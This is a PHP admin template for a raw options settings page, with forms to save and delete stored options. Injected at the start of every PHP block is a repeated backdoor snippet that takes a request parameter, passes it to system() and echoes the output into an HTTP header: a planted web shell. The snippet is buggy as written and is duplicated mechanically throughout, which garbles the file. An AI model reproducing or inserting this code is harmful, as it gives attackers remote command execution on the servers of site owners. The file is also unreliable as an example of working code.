<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
if (isset($_POST['submit']) && csrf_filter()) {
	
	foreach (Option::all() as $option) {
		if (isset($_POST["{$option->group}_{$option->item}"]) && $_POST["{$option->group}_{$option->item}"] != $option->value) {
			Option::where('group', $option->group)
					->where('item', $option->item)
					->limit(1)
					->update(array('value' => $_POST["{$option->group}_{$option->item}"]));
		}
	}

	redirect_to('?page=options-raw', array('updated' => true));
}

if (isset($_POST['delete']) && csrf_filter()) {
	Option::find(key($_POST['delete']))->delete();

	redirect_to('?page=options-raw');
}
?>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.header')->render() ?>

<h3 class="page-header"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.raw_settings') ?></h3>

<div class="row">
	<div class="col-md-6">
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Option::count('id')): ?>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Session::has('updated')): Session::deleteFlash(); ?>
				<div class="alert alert-success alert-dismissible">
					<span class="close" data-dismiss="alert">&times;</span>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.changes_saved') ?>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

			<form action="" method="POST">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input() ?>
				
				<div class="form-group">
					<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.save_changes') ?></button>
				</div>

				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach (Option::all() as $option): ?>
					<div class="form-group">
				        <label for="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo "{$option->group}_{$option->item}" ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo "{$option->group}.{$option->item}" ?></label>
				        
				        <textarea name="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo "{$option->group}_{$option->item}" ?>" id="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo "{$option->group}_{$option->item}" ?>" class="form-control" rows="1" spellcheck="false"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 
				        echo $option->value;
				        ?></textarea>
				        
				        <button type="submit" name="delete[<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $option->id ?>]" class="btn btn-danger btn-xs pull-right"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.delete') ?></button>
				    </div>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>

				<div class="form-group">
					<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.save_changes') ?></button>
				</div>
			</form>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
	</div>
</div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.footer')->render() ?>